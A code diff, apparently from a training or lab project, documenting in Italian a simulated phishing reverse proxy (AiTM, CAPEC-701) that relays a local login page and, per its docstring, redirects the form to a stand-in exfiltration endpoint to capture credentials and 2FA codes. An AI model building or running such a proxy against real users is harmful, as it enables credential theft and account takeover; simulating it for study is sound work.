@@ -1,12 +1,27 @@
+"""
+Simulatore di Reverse Proxy Malevolo Browser-in-the-Middle (CAPEC-701 / AiTM).
+
+Questo modulo avvia un server HTTP multi-thread sulla porta 5001 (http://localhost:5001)
+che emula il funzionamento dei framework moderni di phishing reverse proxy (es. Evilginx, Modlishka).
+Caratteristiche operative simulate:
+1) Effettua il proxying trasparente della pagina originale dalla porta 5000;
+2) Altera a runtime il DOM per dirottare la form action verso l'endpoint di esfiltrazione (http://attacker-evil-proxy.com/harvest);
+3) Cattura credenziali e token 2FA/OTP trasmessi dalla vittima tramite l'endpoint /harvest.
+"""
+
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
 import urllib.request
 
 class BitMProxyHandler(BaseHTTPRequestHandler):
+    """
+    Gestore delle richieste HTTP per il proxy malevolo di simulazione.
+    Inietta la manomissione del form nelle risposte GET e registra il furto credenziali nei POST.
+    """
     def do_GET(self):
         if self.path == "/login" or self.path == "/":
             try:
-                # Recupera l'HTML originale dal server target legittimo (porta 5000) con timeout di 3s
-                print("[BitM Proxy 5001] Fetching target page from http://127.0.0.1:5000/login ...")
+                # Recupero dell'HTML autentico dal server target legittimo (porta 5000) con timeout cautelativo di 3s
+                print("[BitM Proxy 5001] Inoltro richiesta upstream verso http://127.0.0.1:5000/login ...")
                 req = urllib.request.urlopen("http://127.0.0.1:5000/login", timeout=3.0)
                 original_html = req.read().decode("utf-8")
 
